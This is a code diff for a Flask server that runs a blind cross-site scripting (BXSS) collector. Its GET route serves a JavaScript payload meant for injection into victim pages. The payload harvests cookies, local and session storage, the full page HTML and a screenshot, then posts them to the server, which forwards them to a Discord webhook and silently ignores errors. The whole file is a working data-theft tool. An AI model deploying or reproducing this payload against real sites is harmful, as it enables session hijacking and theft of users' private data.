@@ -1,63 +1,115 @@
-from flask import Flask, request, jsonify
-import logging
+from flask import Flask, request, jsonify, Response
+from flask_cors import CORS
 from datetime import datetime
-import requests
-from dotenv import load_dotenv
 import os
+import json
+import requests
+import base64
+from dotenv import load_dotenv
 
 load_dotenv()
-DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
 
 app = Flask(__name__)
-logging.basicConfig(filename='bxss.log', level=logging.INFO)
+CORS(app)
 
-def send_to_discord(data):
-    embed = {
-        "title": "🧠 BXSS Hunter Alert",
-        "color": 16711680,
-        "fields": [
-            {"name": "📍 URL", "value": data.get("url", "N/A"), "inline": False},
-            {"name": "🌐 Origin", "value": data.get("origin", "N/A"), "inline": True},
-            {"name": "📤 Referer", "value": data.get("referer", "N/A"), "inline": True},
-            {"name": "👤 User-Agent", "value": data.get("userAgent", "N/A")[:1024], "inline": False},
-            {"name": "🍪 Cookies", "value": data.get("cookies", "None")[:1024], "inline": False},
-            {"name": "📦 Local Storage", "value": data.get("localStorage", "N/A")[:1024], "inline": False},
-            {"name": "🕐 Time", "value": data.get("timestamp", "N/A"), "inline": True},
-            {"name": "🛠️ Payload URL", "value": data.get("payloadURL", "N/A"), "inline": True},
-            {"name": "🖥️ IP Address", "value": data.get("ip", "N/A"), "inline": True}
-        ],
-        "footer": {"text": "BXSS Logger"},
-    }
+DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK_URL")
+
+@app.route('/', methods=['GET', 'POST'])
+def bxss_logger():
+    if request.method == 'GET':
+        # JavaScript payload returned when / is accessed via <script src="...">
+        js = f"""
+(async () => {{
+  try {{
+    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+    const data = {{
+      type: "json",
+      url: location.href,
+      origin: location.origin,
+      referrer: document.referrer,
+      userAgent: navigator.userAgent,
+      cookies: document.cookie,
+      localStorage: JSON.stringify(localStorage),
+      sessionStorage: JSON.stringify(sessionStorage),
+      html: document.documentElement.outerHTML,
+      timestamp: new Date().toISOString()
+    }};
+
+    await fetch("{request.host_url}", {{
+      method: "POST",
+      headers: {{
+        "Content-Type": "application/json"
+      }},
+      body: JSON.stringify(data)
+    }});
+
+    await delay(2000);
+
+    const canvas = await html2canvas(document.body);
+    const imgData = canvas.toDataURL("image/png");
+
+    await fetch("{request.host_url}", {{
+      method: "POST",
+      headers: {{
+        "Content-Type": "application/json"
+      }},
+      body: JSON.stringify({{
+        type: "screenshot",
+        screenshot: imgData
+      }})
+    }});
+  }} catch (e) {{
+    console.error("BXSS script error:", e);
+  }}
+}})();
+// Required for html2canvas to work
+let s = document.createElement("script");
+s.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
+document.head.appendChild(s);
+"""
+        return Response(js, mimetype="application/javascript")
+
+    # Handle POST: either metadata or screenshot
     try:
-        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]})
-    except Exception as e:
-        print(f"Failed to send Discord alert: {e}")
+        payload = request.get_json(force=True)
+    except Exception:
+        return jsonify({"error": "Invalid JSON"}), 400
 
-@app.route('/log', methods=['POST','GET'])
-def log_data():
-    data = request.get_json(force=True, silent=True)#updated
-    data['ip'] = request.remote_addr
-    data['received_at'] = datetime.utcnow().isoformat()
+    payload_type = payload.get("type", "json")
 
-    log = "\n--- BXSS Report ---\n"
-    for key, val in data.items():
-        log += f"{key.upper()}:\n{val}\n\n"
-    log += "-------------------\n"
+    if payload_type == "json":
+        payload["ip"] = request.remote_addr
+        payload["server_time"] = datetime.utcnow().isoformat()
 
-    print(log)
-    logging.info(log)
+        if DISCORD_WEBHOOK:
+            try:
+                requests.post(DISCORD_WEBHOOK, json={
+                    "content": f"📦 **BXSS Log**\n```json\n{json.dumps(payload, indent=2)}```"
+                })
+            except Exception as e:
+                pass  # Avoid printing errors
+        return jsonify({"status": "json_received"})
 
-    send_to_discord(data)
-    return jsonify({"status": "received"}), 200
+    elif payload_type == "screenshot":
+        image_data = payload.get("screenshot", "")
+        if image_data.startswith("data:image/png;base64,"):
+            image_data = image_data.replace("data:image/png;base64,", "")
 
-@app.route('/payload.js')
-def serve_payload():
-    with open('payload.js') as f:
-        return f.read(), 200, {'Content-Type': 'application/javascript'}
+        try:
+            image_bytes = base64.b64decode(image_data)
+            files = {
+                'file': ('screenshot.png', image_bytes, 'image/png')
+            }
+            if DISCORD_WEBHOOK:
+                requests.post(DISCORD_WEBHOOK, files=files)
+        except Exception as e:
+            pass  # Ignore errors
 
-@app.route('/')
-def index():
-    return 'BXSS Hunter Active.'
+        return jsonify({"status": "screenshot_received"})
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080)
+    return jsonify({"error": "Unknown type"}), 400
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
